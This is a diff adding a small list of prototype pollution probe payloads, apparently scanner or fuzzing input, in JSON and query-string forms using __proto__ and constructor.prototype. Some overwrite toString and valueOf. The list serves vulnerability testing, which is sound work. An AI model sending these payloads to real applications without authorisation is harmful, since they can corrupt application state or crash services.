@@ -1,0 +1,12 @@
+##Prototype Pollution - Math (Canary: 1337)##
+{"__proto__":{"polluted":"1337"}}
+{"constructor":{"prototype":{"polluted":"1337"}}}
+__proto__[polluted]=1337
+constructor[prototype][polluted]=1337
+{"__proto__":{"toString":"1337"}}
+{"__proto__":{"valueOf":"1337"}}
+{"__proto__":{"1337":"polluted"}}
+##Prototype Pollution - Error##
+{"__proto__":{"polluted":"1337"},"test":null,"error":"probe"}
+constructor.prototype.polluted=1337&__proto__[test]=undefined
+__proto__[toString]=invalid&constructor[prototype][valueOf]=NaN
